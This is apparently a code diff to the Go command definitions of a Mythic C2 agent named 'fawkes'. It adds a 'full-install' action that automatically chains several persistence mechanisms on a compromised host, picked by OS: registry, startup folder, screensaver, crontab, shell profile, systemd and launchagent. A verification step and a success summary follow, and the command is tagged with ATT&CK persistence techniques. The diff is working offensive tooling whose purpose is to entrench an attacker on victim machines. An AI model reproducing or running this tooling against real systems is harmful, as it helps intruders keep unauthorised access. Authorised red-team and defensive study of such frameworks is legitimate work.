@@ -1,11 +1,53 @@
 package agentfunctions
 
 import (
+	"encoding/json"
 	"fmt"
 	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
+
+// Chain completion function for persist full-install
+func persistFullInstallDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, _ *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{TaskID: taskData.Task.ID, Success: true}
+	parentID := taskData.Task.ID
+	searchResult, _ := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
+		TaskID: parentID, SearchParentTaskID: &parentID,
+	})
+	summary := "=== Full Persistence Install Complete ===\n"
+	successCount := 0
+	errorCount := 0
+	if searchResult != nil && searchResult.Success {
+		for _, task := range searchResult.Tasks {
+			status := "OK"
+			if task.Status == "error" {
+				status = "FAIL"
+				errorCount++
+			} else {
+				successCount++
+			}
+			display := task.DisplayParams
+			if display == "" {
+				display = task.CommandName
+			}
+			summary += fmt.Sprintf("  [%s] %s — %s\n", status, task.CommandName, display)
+		}
+	}
+	summary += fmt.Sprintf("\nMechanisms: %d/%d installed successfully\n", successCount, successCount+errorCount)
+	if successCount > 0 {
+		summary += "Run 'persist-enum' to verify all installed mechanisms.\n"
+	}
+	completed := true
+	response.Completed = &completed
+	response.Stdout = &summary
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID: taskData.Task.ID, Response: []byte(summary),
+	})
+	logOperationEvent(taskData.Task.ID, fmt.Sprintf("[PERSIST] Full-install on %s: %d/%d mechanisms installed", taskData.Callback.Host, successCount, successCount+errorCount), true)
+	return response
+}
 
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
@@ -16,7 +58,10 @@ func init() {
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1547.001", "T1547.009", "T1546.015", "T1546.002", "T1546.012", "T1053.003", "T1543.002", "T1546.004", "T1098.004", "T1543.004", "T1070.009", "T1547.004", "T1547.012", "T1546.008"},
-		ScriptOnlyCommand:   false,
+		ScriptOnlyCommand: false,
+		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
+			"persistFullInstallDone": persistFullInstallDone,
+		},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -46,7 +91,7 @@ func init() {
 				ModalDisplayName: "Action",
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"install", "remove"},
+				Choices:          []string{"install", "remove", "full-install"},
 				Description:      "Install or remove the persistence entry",
 				DefaultValue:     "install",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -207,6 +252,61 @@ func init() {
 			method, _ := taskData.Args.GetStringArg("method")
 			action, _ := taskData.Args.GetStringArg("action")
 			name, _ := taskData.Args.GetStringArg("name")
+			if action == "full-install" {
+				path, _ := taskData.Args.GetStringArg("path")
+				entryName := name
+				if entryName == "" {
+					entryName = "FawkesUpdate"
+				}
+				// Determine which methods to install based on OS
+				var methods []string
+				os := ""
+				for _, supported := range taskData.Callback.OS {
+					os = strings.ToLower(fmt.Sprint(supported))
+					break
+				}
+				switch {
+				case strings.Contains(strings.ToLower(taskData.Callback.Host), "win") || os == "windows" || os == "":
+					methods = []string{"registry", "startup-folder", "screensaver"}
+				case os == "linux":
+					methods = []string{"crontab", "shell-profile", "systemd"}
+				case os == "macos" || os == "darwin":
+					methods = []string{"launchagent"}
+				default:
+					methods = []string{"registry", "startup-folder"}
+				}
+				display := fmt.Sprintf("full-install: %s (%s)", strings.Join(methods, ", "), entryName)
+				response.DisplayParams = &display
+				// Change action to "install" for agent, method to "list" (safe enumeration)
+				taskData.Args.SetArgValue("action", "install")
+				taskData.Args.SetArgValue("method", "list")
+				// Create parallel subtask group for all persistence methods
+				var tasks []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks
+				for _, m := range methods {
+					params, _ := json.Marshal(map[string]string{
+						"method": m, "action": "install", "name": entryName, "path": path,
+					})
+					tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
+						CommandName: "persist", Params: string(params),
+					})
+				}
+				// Add persist-enum verification as final task
+				tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
+					CommandName: "persist-enum", Params: `{}`,
+				})
+				cb := "persistFullInstallDone"
+				if _, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
+					TaskID: taskData.Task.ID, GroupName: "persist_full_install",
+					GroupCallbackFunction: &cb, Tasks: tasks,
+				}); err != nil {
+					response.Success = false
+					response.Error = fmt.Sprintf("Failed to create full-install group: %v", err)
+					return response
+				}
+				createArtifact(taskData.Task.ID, "Subtask Chain",
+					fmt.Sprintf("Full Persistence: %s + persist-enum verify", strings.Join(methods, ", ")))
+				return response
+			}
 			display := fmt.Sprintf("%s %s", action, method)
 			response.DisplayParams = &display
 			if action == "install" {
